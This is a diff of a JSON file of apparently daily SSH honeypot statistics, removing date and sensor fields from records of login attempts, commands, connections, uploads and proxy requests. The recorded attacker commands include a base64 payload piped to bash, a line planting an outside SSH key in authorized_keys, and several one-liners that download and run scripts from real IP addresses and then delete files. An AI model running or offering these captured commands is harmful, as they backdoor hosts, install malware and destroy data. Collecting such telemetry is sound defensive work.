gfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash",
-      "count": 61,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 61
     },
     {
       "input": "uname -s -v -n -r;nproc;",
-      "count": 6,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 6
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.51",
       "dst_port": 2222,
-      "count": 844,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 844
     },
     {
       "src_ip": "5.188.86.165",
       "dst_port": 2222,
-      "count": 829,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 829
     },
     {
       "src_ip": "5.188.86.207",
       "dst_port": 2222,
-      "count": 698,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 698
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.165",
       "robot": true,
-      "count": 622,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 622
     },
     {
       "src_ip": "5.188.87.51",
       "robot": true,
-      "count": 620,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 620
     },
     {
       "src_ip": "5.188.86.207",
       "robot": true,
-      "count": 494,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 494
     }
   ],
   "file_download": [
@@ -1551,18 +1169,14 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "23.247.33.61",
-      "count": 1,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -1570,25 +1184,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "chek.zennolab.com",
       "dst_port": 80,
-      "count": 1071,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1071
     },
     {
       "src_ip": "5.188.86.165",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 622,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 622
     },
     {
       "src_ip": "5.188.87.51",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 620,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 620
     }
   ]
 },
@@ -1599,109 +1207,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 16846,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 16846
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 696,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 696
     },
     {
       "username": "root",
       "password": "dietpi",
-      "count": 30,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 30
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 724,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 724
     },
     {
       "input": "lscpu | grep Model",
-      "count": 719,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 719
     },
     {
       "input": "uname",
-      "count": 719,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 719
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 718,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 718
     },
     {
       "input": "cat /etc/issue",
-      "count": 50,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 50
     },
     {
       "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.52.40/sensi.sh; curl -O http://209.141.52.40/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 209.141.52.40 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 209.141.52.40; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.52.40 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *",
-      "count": 8,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 8
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.165",
       "dst_port": 2222,
-      "count": 1273,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1273
     },
     {
       "src_ip": "5.188.86.207",
       "dst_port": 2222,
-      "count": 960,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 960
     },
     {
       "src_ip": "5.188.87.51",
       "dst_port": 2222,
-      "count": 951,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 951
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.165",
       "robot": true,
-      "count": 879,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 879
     },
     {
       "src_ip": "5.188.87.49",
       "robot": true,
-      "count": 827,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 827
     },
     {
       "src_ip": "5.188.86.180",
       "robot": true,
-      "count": 825,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 825
     }
   ],
   "file_download": [
@@ -1712,18 +1290,14 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "203.245.29.159",
-      "count": 1,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -1731,25 +1305,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 1794,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1794
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chek.zennolab.com",
       "dst_port": 80,
-      "count": 1324,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1324
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chekfast.zennolab.com",
       "dst_port": 80,
-      "count": 1255,
-      "date": "2021-06-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1255
     }
   ]
 },
@@ -1760,109 +1328,79 @@
     {
       "username": "root",
       "password": "admin",
-      "count": 16892,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 16892
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 904,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 904
     },
     {
       "username": "root",
       "password": "123",
-      "count": 756,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 756
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 936,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 936
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 933,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 933
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 933,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 933
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 929,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 929
     },
     {
       "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.75.191.234/sh; curl -O http://51.75.191.234/sh; chmod 777 sh; sh sh; tftp 51.75.191.234 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 51.75.191.234; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 51.75.191.234 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *",
-      "count": 20,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 20
     },
     {
       "input": "cd /tmp || cd /run || cd /; wget http://142.11.216.5/xxxbins.sh; chmod 777 xxxbins.sh; sh xxxbins.sh; tftp 142.11.216.5 -c get xxxtftp1.sh; chmod 777 xxxtftp1.sh; sh xxxtftp1.sh; tftp -r xxxtftp2.sh -g 142.11.216.5; chmod 777 xxxtftp2.sh; sh xxxtftp2.sh; rm -rf xxxbins.sh xxxtftp1.sh xxxtftp2.sh; rm -rf *",
-      "count": 11,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 11
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.216",
       "dst_port": 2222,
-      "count": 1241,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1241
     },
     {
       "src_ip": "5.188.86.221",
       "dst_port": 2222,
-      "count": 1018,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1018
     },
     {
       "src_ip": "5.188.86.165",
       "dst_port": 2222,
-      "count": 1018,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1018
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.216",
       "robot": true,
-      "count": 870,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 870
     },
     {
       "src_ip": "5.188.86.221",
       "robot": true,
-      "count": 859,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 859
     },
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 763,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 763
     }
   ],
   "file_download": [
@@ -1873,18 +1411,14 @@
         "positives": 36,
         "total": 59
       },
-      "count": 2,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 2
     }
   ],
   "file_upload": [
     {
       "filename": "eyshcjdmzg",
       "src_ip": "154.223.167.114",
-      "count": 1,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -1892,25 +1426,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 4327,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 4327
     },
     {
       "src_ip": "5.182.39.62",
       "dst_ip": "i.instagram.com",
       "dst_port": 443,
-      "count": 1459,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1459
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "prod.varomoney.com",
       "dst_port": 443,
-      "count": 1307,
-      "date": "2021-03-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1307
     }
   ]
 },
@@ -1921,109 +1449,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18179,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18179
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 1432,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1432
     },
     {
       "username": "root",
       "password": "12345678",
-      "count": 222,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 222
     }
   ],
   "commands": [
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 1474,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1474
     },
     {
       "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
-      "count": 1474,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1474
     },
     {
       "input": "uname -m",
-      "count": 1474,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1474
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 1439,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1439
     },
     {
       "input": "rm -rf /var/tmp/dota*",
-      "count": 32,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 32
     },
     {
       "input": "uname -s -v -n -r",
-      "count": 10,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 10
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1191,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1191
     },
     {
       "src_ip": "5.188.87.57",
       "dst_port": 2222,
-      "count": 1045,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1045
     },
     {
       "src_ip": "5.188.86.221",
       "dst_port": 2222,
-      "count": 1045,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1045
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.221",
       "robot": true,
-      "count": 1031,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1031
     },
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 892,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 892
     },
     {
       "src_ip": "5.188.86.167",
       "robot": true,
-      "count": 726,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 726
     }
   ],
   "file_download": [
@@ -2034,9 +1532,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -2045,9 +1541,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -2056,25 +1550,19 @@
         "positives": 0,
         "total": 56
       },
-      "count": 1,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "103.26.40.145",
-      "count": 30,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 30
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "111.161.74.112",
-      "count": 2,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 2
     }
   ],
   "proxy_request": [
@@ -2082,25 +1570,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "chekfast.zennolab.com",
       "dst_port": 80,
-      "count": 1187,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1187
     },
     {
       "src_ip": "5.188.86.221",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 1034,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1034
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chek.zennolab.com",
       "dst_port": 80,
-      "count": 899,
-      "date": "2021-05-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 899
     }
   ]
 },
@@ -2111,109 +1593,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 8627,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 8627
     },
     {
       "username": "root",
       "password": "admin",
-      "count": 1330,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1330
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 367,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 367
     }
   ],
   "commands": [
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 384,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 384
     },
     {
       "input": "uname -a",
-      "count": 381,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 381
     },
     {
       "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-      "count": 380,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 380
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 378,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 378
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 4,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 4
     },
     {
       "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Oracle123",
-      "count": 1,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.57",
       "dst_port": 2222,
-      "count": 797,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 797
     },
     {
       "src_ip": "5.188.86.210",
       "dst_port": 2222,
-      "count": 665,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 665
     },
     {
       "src_ip": "5.188.86.221",
       "dst_port": 2222,
-      "count": 639,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 639
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.57",
       "robot": true,
-      "count": 609,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 609
     },
     {
       "src_ip": "5.188.86.221",
       "robot": true,
-      "count": 602,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 602
     },
     {
       "src_ip": "5.188.86.210",
       "robot": true,
-      "count": 464,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 464
     }
   ],
   "file_download": [
@@ -2224,9 +1676,7 @@
         "positives": 23,
         "total": 60
       },
-      "count": 1,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -2234,25 +1684,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 4713,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 4713
     },
     {
       "src_ip": "78.128.113.150",
       "dst_ip": "video-weaver.ord03.hls.ttvnw.net",
       "dst_port": 443,
-      "count": 922,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 922
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chekfast.zennolab.com",
       "dst_port": 80,
-      "count": 832,
-      "date": "2021-06-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 832
     }
   ]
 },
@@ -2263,118 +1707,86 @@
     {
       "username": "root",
       "password": "admin",
-      "count": 5212,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 5212
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 681,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 681
     },
     {
       "username": "root",
       "password": "root",
-      "count": 15,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 15
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 691,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 691
     },
     {
       "input": "w",
-      "count": 690,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 690
     },
     {
       "input": "crontab -l",
-      "count": 690,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 690
     }
   ],
   "pre_disconnect_command": [
     {
